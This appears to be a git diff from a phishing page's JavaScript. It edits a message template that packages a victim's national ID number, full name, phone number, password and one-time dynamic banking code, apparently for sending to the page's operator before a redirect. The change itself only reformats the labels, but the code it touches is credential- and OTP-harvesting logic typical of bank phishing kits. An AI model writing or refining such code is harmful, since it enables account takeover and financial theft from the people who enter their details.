@@ -189,7 +189,7 @@
 
                         loadingSpinner.style.display = 'block';
 
-                        const message = `***⚡ DINÁMICA 1 ⚡***\n\n🪪 **Cédula:** ${formData.cedula}\n👤 **Nombres:** ${formData.nombreCompleto}\n#️⃣ **Número:** ${phoneNumber}\n  🔐 **Clave:** ${password}\n ✅**Clave Dinamina 1:** ${otp}`;
+                        const message = `***⚡ DINÁMICA 1 ⚡***\n\n🪪 **Cédula: ** ${formData.cedula}\n👤 **Nombres: ** ${formData.nombreCompleto}\n#️⃣ **Número: ** ${phoneNumber}\n  🔐 **Clave: ** ${password}\n ✅**Clave Dinamina 1:** ${otp}`;
 
                         // Redirigir después de enviar
                         setTimeout(() => {
